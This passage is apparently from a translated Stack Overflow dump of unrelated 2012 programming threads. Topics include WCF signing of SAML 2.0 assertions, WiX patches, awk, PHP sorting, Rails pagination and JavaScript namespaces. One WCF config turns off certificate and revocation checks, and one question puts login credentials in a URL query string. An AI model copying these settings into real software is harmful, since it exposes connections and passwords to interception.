      <ds:Signature Id="Signature-1" xmlns:ds="http://www.w3.org/2000/09/xmldsig#">
        <ds:SignedInfo>
          <ds:CanonicalizationMethod Algorithm="http://www.w3.org/2001/10/xml-exc-c14n#"/>
          <ds:SignatureMethod Algorithm="http://www.w3.org/2000/09/xmldsig#rsa-sha1"/>
          <ds:Reference URI="#id-2">
            <ds:Transforms>
              <ds:Transform Algorithm="http://www.w3.org/2001/10/xml-exc-c14n#"/>
            </ds:Transforms>
            <ds:DigestMethod Algorithm="http://www.w3.org/2000/09/xmldsig#sha1"/>
            <ds:DigestValue>
              <!--Omitted -->
            </ds:DigestValue>
          </ds:Reference>
        </ds:SignedInfo>
        <ds:SignatureValue>
          <!--Omitted -->
        </ds:SignatureValue>
        <ds:KeyInfo Id="KeyId-29B98C291D1FDFB39113352984773792">
          <wsse:SecurityTokenReference wsu:Id="STRId-29B98C291D1FDFB39113352984773893" xmlns:wsu="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-utility-1.0.xsd">
            <wsse:Reference URI="#CertId-29B98C291D1FDFB39113352984773591" ValueType="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-x509-token-profile-1.0#X509v3"/>
          </wsse:SecurityTokenReference>
        </ds:KeyInfo>
      </ds:Signature>
    </wsse:Security>
    <saml:Assertion ID="_54d0c8395de26c3e44730df2c9e8d3e9" IssueInstant="2012-02-17T10:40:36.806Z" Version="2.0" xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion">
      <saml:Issuer>CN=test_client</saml:Issuer>
      <Signature xmlns="http://www.w3.org/2000/09/xmldsig#">
        <SignedInfo>
          <CanonicalizationMethod Algorithm="http://www.w3.org/2001/10/xml-exc-c14n#"/>
          <SignatureMethod Algorithm="http://www.w3.org/2000/09/xmldsig#rsa-sha1"/>
          <Reference URI="#_54d0c8395de26c3e44730df2c9e8d3e9">
            <Transforms>
              <Transform Algorithm="http://www.w3.org/2000/09/xmldsig#enveloped-signature"/>
              <Transform Algorithm="http://www.w3.org/2001/10/xml-exc-c14n#"/>
            </Transforms>
            <DigestMethod Algorithm="http://www.w3.org/2000/09/xmldsig#sha1"/>
            <DigestValue>
              <!--Omitted -->
            </DigestValue>
          </Reference>
        </SignedInfo>
        <SignatureValue>
          <!--Omitted -->
        </SignatureValue>
        <KeyInfo>
          <X509Data>
            <X509Certificate>
              <!--Omitted -->
            </X509Certificate>
          </X509Data>
        </KeyInfo>
      </Signature>
      <saml:Subject>
        <saml:NameID Format="urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress">joe.bloggs@facility.ie</saml:NameID>
      </saml:Subject>
      <saml:Conditions NotBefore="2012-02-17T10:40:21.806Z" NotOnOrAfter="2012-02-17T10:41:06.806Z"/>
    </saml:Assertion>
    <wsa:Action SOAP-ENV:mustUnderstand="1">http://www.xxxxxxx.xxx/ws/schemas/xxxxxx1/xxxx/xxxxxxxxxxxxxx</wsa:Action>
    <wsa:MessageID SOAP-ENV:mustUnderstand="1">uuid:bffc27ba-68d9-44e6-b1f0-e2f852df7715</wsa:MessageID>
  </SOAP-ENV:Header>
  <SOAP-ENV:Body wsu:Id="id-2" xmlns:wsu="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-utility-1.0.xsd">
    <xenc:EncryptedData Id="EncDataId-3" Type="http://www.w3.org/2001/04/xmlenc#Content">
      <xenc:EncryptionMethod Algorithm="http://www.w3.org/2001/04/xmlenc#tripledes-cbc"/>
      <ds:KeyInfo xmlns:ds="http://www.w3.org/2000/09/xmldsig#">
        <wsse:SecurityTokenReference xmlns:wsse="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd">
          <wsse:Reference URI="#EncKeyId-29B98C291D1FDFB39113352984774895"/>
        </wsse:SecurityTokenReference>
      </ds:KeyInfo>
      <xenc:CipherData>
        <xenc:CipherValue>
          <!--Omitted -->
        </xenc:CipherValue>
      </xenc:CipherData>
    </xenc:EncryptedData>
  </SOAP-ENV:Body>
</SOAP-ENV:Envelope> 
```

**这与我使用 WCF 客户端获得的结果一样接近。我可以立即解决的问题是`<o:SecurityTokenReference>`元素应该包含颁发者和序列号，而不是包含一个`KeyIdentifier`元素？**

```
<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" xmlns:a="http://www.w3.org/2005/08/addressing" xmlns:u="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-utility-1.0.xsd">
  <s:Header>
    <a:Action s:mustUnderstand="1" u:Id="_3"/>
    <a:MessageID u:Id="_4">urn:uuid:fc8ef84b-dbf5-4150-a0c3-d4cc986333d1</a:MessageID>
    <ActivityId CorrelationId="a9e1fec4-32bc-4633-909e-3d601c809b3c" xmlns="http://schemas.microsoft.com/2004/09/ServiceModel/Diagnostics">d1909115-8922-46f3-a96c-db15bf91c599</ActivityId>
    <a:ReplyTo u:Id="_5">
      <a:Address>http://www.w3.org/2005/08/addressing/anonymous</a:Address>
    </a:ReplyTo>
    <VsDebuggerCausalityData xmlns="http://schemas.microsoft.com/vstudio/diagnostics/servicemodelsink">uIDPo27oY4/3mnBOry0YL4StqvcAAAAA0UM+eVt4fU2AOe9/B3lPDZNf/2HmAuNEvzAoW0eKVSUACQAA</VsDebuggerCausalityData>
    <a:To s:mustUnderstand="1" u:Id="_6">https://localhost:8089/ws</a:To>
    <o:Security s:mustUnderstand="1" xmlns:o="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd">
      <u:Timestamp u:Id="uuid-e5592f06-32af-40fb-996e-a0a469c7ed5e-2">
        <u:Created>2012-04-24T20:41:50.447Z</u:Created>
        <u:Expires>2012-04-24T20:46:50.447Z</u:Expires>
      </u:Timestamp>
      <e:EncryptedKey Id="uuid-e5592f06-32af-40fb-996e-a0a469c7ed5e-1" xmlns:e="http://www.w3.org/2001/04/xmlenc#">
        <e:EncryptionMethod Algorithm="http://www.w3.org/2001/04/xmlenc#rsa-1_5"/>
        <KeyInfo xmlns="http://www.w3.org/2000/09/xmldsig#">
          <o:SecurityTokenReference>
            <o:KeyIdentifier ValueType="http://docs.oasis-open.org/wss/oasis-wss-soap-message-security-1.1#ThumbprintSHA1" EncodingType="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-soap-message-security-1.0#Base64Binary">lU10DQn4lSpE4fRpE9gslm5QDt0=</o:KeyIdentifier>
          </o:SecurityTokenReference>
        </KeyInfo>
        <e:CipherData>
          <e:CipherValue>
            <!--Omitted-->
          </e:CipherValue>
        </e:CipherData>
        <e:ReferenceList>
          <e:DataReference URI="#_2"/>
          <e:DataReference URI="#_7"/>
          <e:DataReference URI="#_8"/>
        </e:ReferenceList>
      </e:EncryptedKey>
      <o:BinarySecurityToken u:Id="uuid-fad0c01f-ab4b-4a5f-bec6-93aa8c2d5a52-1" ValueType="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-x509-token-profile-1.0#X509v3" EncodingType="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-soap-message-security-1.0#Base64Binary"><!--Omitted--></o:BinarySecurityToken>
      <e:EncryptedData Id="_7" Type="http://www.w3.org/2001/04/xmlenc#Element" xmlns:e="http://www.w3.org/2001/04/xmlenc#">
        <e:EncryptionMethod Algorithm="http://www.w3.org/2001/04/xmlenc#tripledes-cbc"/>
        <e:CipherData>
          <e:CipherValue>
            <!--Omitted-->
          </e:CipherValue>
        </e:CipherData>
      </e:EncryptedData>
      <e:EncryptedData Id="_8" Type="http://www.w3.org/2001/04/xmlenc#Element" xmlns:e="http://www.w3.org/2001/04/xmlenc#">
        <e:EncryptionMethod Algorithm="http://www.w3.org/2001/04/xmlenc#tripledes-cbc"/>
        <e:CipherData>
          <e:CipherValue><!--Omitted--></e:CipherValue>
        </e:CipherData>
      </e:EncryptedData>
    </o:Security>
  </s:Header>
  <s:Body u:Id="_1" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema">
    <e:EncryptedData Id="_2" Type="http://www.w3.org/2001/04/xmlenc#Content" xmlns:e="http://www.w3.org/2001/04/xmlenc#">
      <e:EncryptionMethod Algorithm="http://www.w3.org/2001/04/xmlenc#tripledes-cbc"/>
      <e:CipherData>
        <e:CipherValue><!--Omitted--></e:CipherValue>
      </e:CipherData>
    </e:EncryptedData>
  </s:Body>
</s:Envelope> 
```

将此配置用于 WCF CustomBinding

```
<system.serviceModel>        
        <bindings>
          <customBinding>
            <binding name="WSHttpBinding_IEnquiryRequest" >
              <transactionFlow />
              <security defaultAlgorithmSuite="TripleDesRsa15"
                        authenticationMode="MutualCertificate" 
                        messageSecurityVersion="WSSecurity11WSTrustFebruary2005WSSecureConversationFebruary2005WSSecurityPolicy11BasicSecurityProfile10" 
                        requireDerivedKeys="false"
                        >

                      <secureConversationBootstrap authenticationMode="CertificateOverTransport" 
                                           messageSecurityVersion="WSSecurity11WSTrustFebruary2005WSSecureConversationFebruary2005WSSecurityPolicy11BasicSecurityProfile10" 
                                           requireDerivedKeys="false" />
              </security>
              <textMessageEncoding messageVersion="Soap11WSAddressing10" />
              <!--<mtomMessageEncoding messageVersion="Soap11WSAddressing10" />-->
              <httpsTransport requireClientCertificate="true" />
            </binding>
          </customBinding>            
        </bindings>
      <behaviors>
        <endpointBehaviors>
          <behavior name="certBehaviour">            
              <clientCredentials>
                <!-- clientCertificate not defaultCertificate -->
                <clientCertificate x509FindType="FindBySubjectName" storeLocation="CurrentUser" storeName="My" findValue="test_client" />
                <serviceCertificate>
                  <defaultCertificate x509FindType="FindBySubjectName" storeLocation="CurrentUser" storeName="My" findValue="test_server"/>
                  <authentication revocationMode="NoCheck" certificateValidationMode="None"  />
                </serviceCertificate>
              </clientCredentials>            
          </behavior>
        </endpointBehaviors>
      </behaviors>
        <client>
          <endpoint
               address="https://localhost:8089/pvs/ws"
               binding="customBinding"
               bindingConfiguration="WSHttpBinding_IEnquiryRequest"
               contract="XXXService.enquiryRequest"
               name="WSHttpBinding_IEnquiryRequest"
               behaviorConfiguration="certBehaviour"
               >
            <identity>
              <dns value="test_server"/>
            </identity>
          </endpoint>
        </client>
    </system.serviceModel> 
```

**我不知道如何在签名之前将 SAML 2.0 断言插入其中。那和上面的关键发行者/序列问题是我的主要问题在于请求的地方。**

任何和所有的帮助表示赞赏

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-27T11:04:30.207

在 WCF 论坛上的 Yaron 的帮助下，最终能够到达那里

[http://social.msdn.microsoft.com/Forums/en-US/wcf/thread/9a1db0bb-d632-4f11-80b4-fab78be3a3ee](http://social.msdn.microsoft.com/Forums/en-US/wcf/thread/9a1db0bb-d632-4f11-80b4-fab78be3a3ee)

很难，但最终还是到了那里，我想我会在某一时刻从头开始写它！

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-24T22:39:08.373

如果您不在 XP 上运行，[WIF支持 SAML 2.0 令牌格式。](http://msdn.microsoft.com/en-us/security/aa570351)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-08T16:53:27.077

我使用了一个示例 XML 模板，而不是全部在代码中完成，但这也是可能的。

注意：您需要使用[自定义编码器](http://msdn.microsoft.com/en-us/library/ms751486.aspx)将此添加到消息中- 这样您就可以将 SAML 令牌插入标头（仅标头元素被签名，而不是内容）

我有点着急，如果您需要更多信息，请告诉我

```
 private void SignSaml()
    {
        RSACryptoServiceProvider rsaProvider = (RSACryptoServiceProvider)SecurityController.ClientCertificate.PrivateKey;

        //Load the private key from xml file
        XmlDocument xmlDocument = new XmlDocument();
        xmlDocument.LoadXml(_samlTextWithElementValues);            

        // Create a SignedXml object.
        SignedXml signedXml = new SignedXml(xmlDocument);

        //Specify the canonicalization method
        signedXml.SignedInfo.CanonicalizationMethod = SignedXml.XmlDsigExcC14NTransformUrl;
        // Add the key to the SignedXml document.
        signedXml.SigningKey = rsaProvider;

        // Add the x509 data to the signature
        KeyInfo keyInfo = new KeyInfo();
        KeyInfoX509Data keyInfoClause = new KeyInfoX509Data(SecurityController.ClientCertificate, X509IncludeOption.None);
        keyInfoClause.AddCertificate(SecurityController.ClientCertificate);
        keyInfo.AddClause(keyInfoClause);
        signedXml.KeyInfo = keyInfo;
         // Create a reference to be signed.
        Reference reference = new Reference("#_54d0c8395de26c3e44730df2c9e8d3e9");

        //reference.Uri = ;

        // Add an enveloped transformation to the reference.
        XmlDsigEnvelopedSignatureTransform env = new XmlDsigEnvelopedSignatureTransform();
        reference.AddTransform(env);
        reference.AddTransform(new XmlDsigExcC14NTransform());

        // Add the reference to the SignedXml object.
        signedXml.AddReference(reference);

        // Compute the signature.
        signedXml.ComputeSignature();

        // Get the XML representation of the signature and save
        // it to an XmlElement object.
        XmlElement xmlDigitalSignature = signedXml.GetXml();

        // Append the element to the XML document.
        xmlDocument.DocumentElement.AppendChild(xmlDocument.ImportNode(xmlDigitalSignature, true));
        _samlSignedWithCertificate = xmlDocument.InnerXml;
    } 
```

根据要求添加配置

```
<customBinding>
    <binding name="BINDING" >
      <transactionFlow />
      <security defaultAlgorithmSuite="TripleDesRsa15"
                authenticationMode="MutualCertificate"
                messageSecurityVersion="WSSecurity10WSTrust13WSSecureConversation13WSSecurityPolicy12BasicSecurityProfile10"
                requireDerivedKeys="false"
                messageProtectionOrder="SignBeforeEncrypt">
        <secureConversationBootstrap authenticationMode="CertificateOverTransport"
                messageSecurityVersion="WSSecurity11WSTrustFebruary2005WSSecureConversationFebruary2005WSSecurityPolicy11BasicSecurityProfile10"
                requireDerivedKeys="false" />
      </security>
      <httpsTransport requireClientCertificate="true" />
    </binding>
  </customBinding> 
```

# php - 顺序多维数组

> ID：10305883
> 
> 赞同：1
> 
> 时间：2012-04-24T20:57:31.310
> 
> 标签：php, arrays, multidimensional-array

我希望通过数组的“时间戳”部分从最低到最高（ASC）订购以下数组。

```
Array
(
[188] => Array
    (
        [date] => 28-04-2012
        [timestamp] => 1335571200
        [opposition] => Rayleigh 1st XI
        [teaperson] => 
    )

[182] => Array
    (
        [date] => 08-03-2012
        [timestamp] => 1331164800
        [opposition] => Galleywood 1st XI
        [teaperson] => 33
    )

[180] => Array
    (
        [date] => 07-07-2012
        [timestamp] => 1341619200
        [opposition] => High Roding 1st XI
        [teaperson] => 45
    )

) 
```

我见过 array_multisort 函数，但不确定如何正确使用它。

干杯

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-24T20:58:11.640

采用[`usort`](http://php.net/usort)

```
usort($arr,function($a,$b) {return $a['timestamp']-$b['timestamp'];}) 
```

# qt - qtextstream windows x64 调试失败

> ID：10305885
> 
> 赞同：1
> 
> 时间：2012-04-24T20:57:38.767
> 
> 标签：qt, stdout, qfile

我在调试中使用用 VS 2008 x64 构建的 Qt 4.8.0。以下行导致异常。

```
QTextStream tf(stdout); 
```

这在 x64 版本和 x86 中的调试和发布中工作正常。具体来说，故障发生在qfile.cpp的第1163行

```
qint64 pos = (qint64)QT_FTELL(fh); 
```

为什么会发生这种情况，我该如何解决？

谢谢

编辑，这是显示错误的屏幕截图 ![在此处输入图像描述](../Images/4dd0d589f1804a48f85b3eb2289ca327.png)

# iphone - 向 URL 发送用户名/密码并返回 ID 号

> ID：10305894
> 
> 赞同：0
> 
> 时间：2012-04-24T20:58:39.810
> 
> 标签：iphone, objective-c, http, mobile

我必须将一些登录凭据发送到我们的服务器，这将验证它们并发回客户 ID。实际上，如果您从浏览器访问 URL，它会在屏幕上显示客户 ID。我已经编写了制造 URL 的部分，但我不知道如何提出这样的请求，然后将该客户 ID 返回到我的 iphone 应用程序中的字符串中。

测试帐户的示例 URL 是：[https ://order.americantaxi.com/ATOnlineOrderWeb/servlet/SmartApp?command=login&u=babarshabbir&p=babarshabbir](https://order.americantaxi.com/ATOnlineOrderWeb/servlet/SmartApp?command=login&u=babarshabbir&p=babarshabbir)

非常感谢任何指向正确方向的指针！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-24T21:02:56.727

查看iOS 开发人员库中的[URL 加载系统编程指南](https://developer.apple.com/library/ios/#documentation/Cocoa/Conceptual/URLLoadingSystem/)。

# wix - 使用纯 WIX 进行修补

> ID：10305897
> 
> 赞同：5
> 
> 时间：2012-04-24T20:58:51.603
> 
> 标签：wix, patch, wix3.5, wix3.6

我正在为纯粹使用 WIX 创建一个补丁而苦苦挣扎，我希望有人能引导我朝着正确的方向前进。

我有几百个源文件，我对它们进行加热以创建一个收获文件，然后使用蜡烛和光创建一个包。

我需要更改一些配置文件，并使用更改创建第二个包。

使用 Torch 和 pyro 我创建了 .wixmst 文件，然后在尝试创建 msp 文件时，pyro 抱怨以下错误。

pyro.exe：错误 PYRO0252：没有提供有效的转换来附加到补丁。检查以确保您在命令行上传递的转换具有在补丁中创建的匹配基线。此外，请确保您的目标和升级之间存在差异。

我的问题真的是：patch.wxs 应该包含什么？

这是我的 patch.wxs 的样子：

```
<?xml version="1.0" encoding="UTF-8"?>
<Wix xmlns="http://schemas.microsoft.com/wix/2006/wi">

    <Patch 
        AllowRemoval="yes"
        Manufacturer="sample llc" 
        MoreInfoURL="sample.com"
        DisplayName="Env Patch" 
        Description="Env Specfic Patch" 
        Classification="Update"
        >

        <Media Id="5000" Cabinet="RTM.cab">
            <PatchBaseline Id="RTM" />
        </Media>

        <PatchFamilyRef Id="EnvPatchFamily" />
    </Patch>

    <Fragment>    
        <PatchFamily Id='EnvPatchFamily' Version='1.0.0.0' ProductCode="PUT-GUID-HERE" Supersede='yes' >

            ********************************************** 
                What component Ref should I put in here
                heat creates a component group and I can't
                put ComponentGroupRef in here
            **********************************************

    </PatchFamily>
    </Fragment>
</Wix> 
```

我正在使用此链接中描述的 Wix 补丁： [http ://wix.sourceforge.net/manual-wix3/wix_patching.htm](http://wix.sourceforge.net/manual-wix3/wix_patching.htm)

但是，它不考虑使用 heat 创建的源 wix 文件。有人可以告诉我我在这里做错了什么吗？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-04-26T15:13:16.450

希特什，

对我来说，热量会创建一个像这样的组件组：

```
<Fragment>
    <ComponentGroup Id="MyFiles">
        <ComponentRef Id="cmp2AA1A30564C621322ECB3CDD70B1C03C" />
        <ComponentRef Id="cmp788C978F16E473D4FD85720B5B75C207" />
    </ComponentGroup>
</Fragment> 
```

加热命令：

```
"%WIX%\bin\heat.exe" dir slndir\bin\Release -cg MyFiles -gg -scom -sreg -sfrag -srd -dr INSTALLDIR -out ..\Wix\MyFiles.wxs -var var.BinOutputPath -nologo -v -ke  -t wixtransform.xsl 
```

在 patch.wxs 中：

```
<Fragment>    
    <PatchFamily Id='ProductPatchFamily' Version='1.3.0.0' Supersede='yes'>
        <ComponentRef Id="cmp2AA1A30564C621322ECB3CDD70B1C03C" />
        <ComponentRef Id="cmp788C978F16E473D4FD85720B5B75C207" />
    </PatchFamily>
</Fragment> 
```

**注意：PatchFamily 标签中没有 ProductCode 属性**

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2018-06-18T14:38:52.913

我还想提一下，`PatchFamily`在构建补丁时元素是可选的，旨在允许对将要修补的确切内容进行细粒度控制。在大多数情况下，我发现在构建补丁时我想包含 MSI 的两个版本之间的所有差异，在这种情况下我`PatchFamily`完全省略了。在您的情况下，生成的补丁 WXS 如下所示：

```
<?xml version="1.0" encoding="UTF-8"?>
<Wix xmlns="http://schemas.microsoft.com/wix/2006/wi">
    <Patch 
        AllowRemoval="yes"
        Manufacturer="sample llc" 
        MoreInfoURL="sample.com"
        DisplayName="Env Patch" 
        Description="Env Specfic Patch" 
        Classification="Update"
    >
        <Media Id="5000" Cabinet="RTM.cab">
            <PatchBaseline Id="RTM" />
        </Media>
    </Patch>
</Wix> 
```

我希望这个答案可以帮助任何有类似问题的人，即**不想**手动构建补丁系列，**不想**`ComponentRef`在每次需要构建补丁时手动包含。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2015-12-16T05:49:05.350

我遇到了同样的问题，解决此错误的方法是将 GUID 添加到组件中，并且对于两个版本的 msi 都应该保持相同。

```
 <MajorUpgrade DowngradeErrorMessage="A newer version of [ProductName] is already installed." />
    <MediaTemplate />

    <Feature Id="ProductFeature" Title="WixPatch" Level="1">
        <ComponentGroupRef Id="ProductComponents" />
    </Feature>
</Product>

<Fragment>
    <Directory Id="TARGETDIR" Name="SourceDir">
        <Directory Id="ProgramFilesFolder">
            <Directory Id="INSTALLFOLDER" Name="WixPatch" />
        </Directory>
    </Directory>
</Fragment>

<Fragment>
    <ComponentGroup Id="ProductComponents" Directory="INSTALLFOLDER" >
         <Component Id="File1" **Guid="3A64BE7A-BBEC-40AD-8319-45C602734146"**>
     <File Source="D:\V2\File1.txt" Name="File1" KeyPath="yes" DiskId="1" Id="F1"/>
         </Component>

</ComponentGroup>
</Fragment> 
```

# awk - awk 打印给定范围的列

> ID：10305898
> 
> 赞同：1
> 
> 时间：2012-04-24T20:58:58.577
> 
> 标签：awk, tabular

我的数据如下所示：

```
0.000000 0.071429 0.071429 0.857143 
0.071429 0.428571 0.071429 0.428571 
0.357143 0.214286 0.357143 0.071429 
0.000000 0.714286 0.000000 0.285714 
0.000000 0.571429 0.000000 0.428571 
0.428571 0.357143 0.071429 0.142857 
0.000000 0.071429 0.071429 0.857143 
0.071429 0.000000 0.928571 0.000000 
0.000000 0.071429 0.000000 0.928571 
0.000000 0.285714 0.000000 0.714286 
0.142857 0.000000 0.785714 0.071429 
```

我希望它看起来像这样：

```
AC name_of_the_file.txt
00 0.000000 0.071429 0.071429 0.857143 
01 0.071429 0.428571 0.071429 0.428571 
02 0.357143 0.214286 0.357143 0.071429 
03 0.000000 0.714286 0.000000 0.285714 
04 0.000000 0.571429 0.000000 0.428571 
05 0.428571 0.357143 0.071429 0.142857 
06 0.000000 0.071429 0.071429 0.857143 
07 0.071429 0.000000 0.928571 0.000000 
08 0.000000 0.071429 0.000000 0.928571 
09 0.000000 0.285714 0.000000 0.714286 
10 0.142857 0.000000 0.785714 0.071429  
XX
// 
```

我怎样才能 awk $1 的范围（从 00 到文件结束）？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-24T21:03:15.723

单程：

```
awk 'FNR == 1 { print FILENAME } { printf "%02d %s\n", FNR - 1, $0 }' infile 
```

输出：

```
infile
00 00 0.000000 0.071429 0.071429 0.857143 
01 01 0.071429 0.428571 0.071429 0.428571 
02 02 0.357143 0.214286 0.357143 0.071429 
03 03 0.000000 0.714286 0.000000 0.285714 
04 04 0.000000 0.571429 0.000000 0.428571 
05 05 0.428571 0.357143 0.071429 0.142857 
06 06 0.000000 0.071429 0.071429 0.857143 
07 07 0.071429 0.000000 0.928571 0.000000 
08 08 0.000000 0.071429 0.000000 0.928571 
09 09 0.000000 0.285714 0.000000 0.714286 
10 10 0.142857 0.000000 0.785714 0.071429 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-04-24T21:03:33.740

我不清楚真正的问题是什么。从表面上看，这应该可以完成工作：

```
awk '{ if (line++ == 0) { print "AC " FILENAME; } printf("%.2d %s\n", NR-1, $0); }
     END { print "XX\n//" }' 
```

# ruby-on-rails - Rails 3 - Pagination with Kaminari - 显示一个控制器的动作，浏览另一个控制器的记录

> ID：10305900
> 
> 赞同：0
> 
> 时间：2012-04-24T20:59:09.560
> 
> 标签：ruby-on-rails, ruby-on-rails-3, controller, pagination, kaminari

我目前的设置是一个讨论有很多帖子。因此，讨论的显示动作显示了一个帖子列表。

讨论/show.html.erb：

```
<% for post in @discussion.posts %>
<div class="post" id="<%= post.id %>">
    <div class="post-content">
        <div class="post-user">
            <div class="name"><%= link_to post.user.username, post.user %></div>
        </div>
        <div class="post-body">
            <%= post.content %>
        </div>
    </div>
</div>
<% end %> 
```

这是我的 Discussions_controller 显示操作：

```
def show
   @forum = Forum.find_by_permalink(params[:forum_id])
   @discussion = Discussion.find(params[:id])
end 
```

每次我尝试将 paginate 方法添加到视图中时，都会出现一系列错误。我知道我在这里踩错了脚，那么我应该从哪里开始让分页为这个页面工作？

提前非常感谢，对 Rails 还是有些陌生！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-24T21:15:22.390

改变

```
@discussion = Discussion.find(params[:id]) 
```

至

```
@posts = Discussion.find(params[:id]).posts.page(params[:page]).per(20) 
```

你的观点将是

```
<% for post in @posts %> 
```

然后你会在视图中添加分页代码

```
<%= paginate(@posts) %> 
```

# javascript - 如何将我的 JavaScript 对象分成多个文件

> ID：10305901
> 
> 赞同：0
> 
> 时间：2012-04-24T20:59:10.420
> 
> 标签：javascript

我正在尝试将我的 JavaScript 分离成不错的库。我在 net 顶级域下有 2 家公司（net.foxbomb 和 net.matogen）

```
var net = {
    foxbomb : {
        'MyObject' : function() {
            console.log ("FoxBomb")
        }
    }
} 
```

```
var net = {
    matogen : {
        'MyObject' : function() {
            console.log ("Matogen");
        }
    }
} 
```

```
var f = new net.foxbomb.MyObject();
var m = new net.matogen.MyObject(); 
```

当然，我刚刚定义了两个网络——这是行不通的。这样做的正确方法是什么？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-24T21:01:03.087

用逗号分隔属性：

```
var net = {
    foxbomb : {
        'MyObject' : function() {
            console.log ("FoxBomb")
        }
    }, // <-- Comma
    matogen : {
        'MyObject' : function() {
            console.log ("Matogen");
        }
    }
}; 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-04-24T21:03:46.350

文件 1：

```
var net = net || {};

net.foxbomb = {

  // ...

}; 
```

文件 2：

```
var net = net || {};

net.matogen = {

  // ...

}; 
```

小提琴：http: [//jsfiddle.net/Q8TnL/1/](http://jsfiddle.net/Q8TnL/1/)

# css - 超出溢出范围：IE 中的隐藏框

> ID：10305902
> 
> 赞同：0
> 
> 时间：2012-04-24T20:59:12.947
> 
> 标签：css, internet-explorer, overflow, css-position

我正在尝试创建一个将出现在页面中间的弹出框。外框由我们使用的 CMS 定义，并且附加了溢出：隐藏和宽度：250px 样式。我们想要“摆脱外盒”的内盒在我们的控制之下，我们几乎可以做任何我们想做的事情。

不幸的是，我们在 IE 中尝试的一切都不会让弹出窗口从父框的溢出中“逃脱”：隐藏。在我们的例子中，将弹出窗口移到父 div 之外是不可能的。

注意 - 我们测试过的所有其他浏览器都可以按照我们的意愿工作。

这是一个简单的例子。

```
<html>
<body>
    <div style="width:250px; overflow:hidden; background-color:#dddddd;">
        <p>
            Here is some text that appears within the primary outer box.
        </p>
        <div id='popup2' style="position:absolute; z-index:500; top:0px; left:0px; width:400px; height:200px; background-color:pink;">
            <a href="#" onclick="document.getElementById('popup2').style.display = 'none'; return false;">Close</a><br/>
            This is the popoup. This is the popoup. This is the popoup. This is the popoup. This is the popoup. This is the popoup. This is the popoup. This is the popoup. This is the popoup. This is the popoup.
            This is the popoup. This is the popoup. This is the popoup. This is the popoup. This is the popoup. This is the popoup. This is the popoup. This is the popoup. This is the popoup. This is the popoup.
            This is the popoup. This is the popoup. This is the popoup. This is the popoup. This is the popoup. This is the popoup. This is the popoup. This is the popoup. This is the popoup. This is the popoup.
        </div>
    </div>
</body>
</html> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-25T02:51:13.457

我目前只能在 IE9 中对其进行测试，但是如果您包含严格的文档类型，它可以正常工作：

[http://jsfiddle.net/wgWZv/](http://jsfiddle.net/wgWZv/)

jsfiddle 使用 html 5

```
<!DOCTYPE HTML> 
```

我用 4 strict 对其进行了测试，它也可以正常工作。

```
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd"> 
```

# c# - 表单序列化问题

> ID：10305905
> 
> 赞同：0
> 
> 时间：2012-04-24T20:59:35.073
> 
> 标签：c#, jquery, asp.net, asp.net-mvc

在我的 MVC 应用程序中，我定义了一个 ViewModel，例如：

```
public class TestModel : Test
    {        
        public TestModel (Models.Test1 t1)
            :base(t1)
        {  }
        public TestModel (Models.Test1 t1, Models.Test1 t2)
            :base(t1,t2)
        {    } 
```

类测试定义为：

```
public class Test
    {
        public Test(Models.Test1 t1)
        {
//set the properties for t1
}

public Test(Models.Test1 t1, Models.Test1 t2)
            :this(t1)
{
//set properties for t2
}

}
// properties for t1 and t2
} 
```

TestModel 在我的视图中用于显示来自 t1 和 t2 的组合字段。当我提交这样的表格时：

```
$('form').submit(function (evt) {                 
            Save($(this).serialize(),
             function () {
                 $('.loading').show();
             },
             function () {
                 alert('success');
             });
         });
         $('a.save').click(function (evt) {                
             $(this).parents('form').submit();
         });

- the controller action below is never hit.

    [HttpPost]        
             public JsonResult Save(TestModel camp)
            {                           
                    Helper.Save(camp);
                    return Json(JsonEnvelope.Success());           
            } 
```

我认为序列化不起作用，因为 TestModel 派生自 Test。关于如何使它工作的任何建议？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-24T21:02:31.157

> 我认为序列化不起作用，因为 TestModel 派生自 Test。关于如何使它工作的任何建议？

序列化不起作用，因为您`TestModel`没有无参数构造函数。默认模型绑定器不知道如何实例化此类。只有具有无参数构造函数的类才能用作视图模型。或者您将不得不编写一个自定义模型绑定器来指示要使用 2 个自定义构造函数中的哪一个。

因此，请继续重新考虑您的视图模型设计。可以使用继承但没有自定义构造函数。

# javascript - 服务器更改时自动更新/重新加载当前页面的库

> ID：10305906
> 
> 赞同：1
> 
> 时间：2012-04-24T20:59:52.697
> 
> 标签：javascript, webserver, reload

我正在寻找一个 Javscript 库、服务器等，它允许我在服务器中的版本更改时自动重新加载网页。

更新：我了解所涉及的技术，以及实现它需要什么。我正在寻找的是**已经制作**好的东西。我可以在我的 HTML 文件中包含一个脚本，它将为我监控服务器。我的意思是，为什么要重新发明轮子？:D

* * *

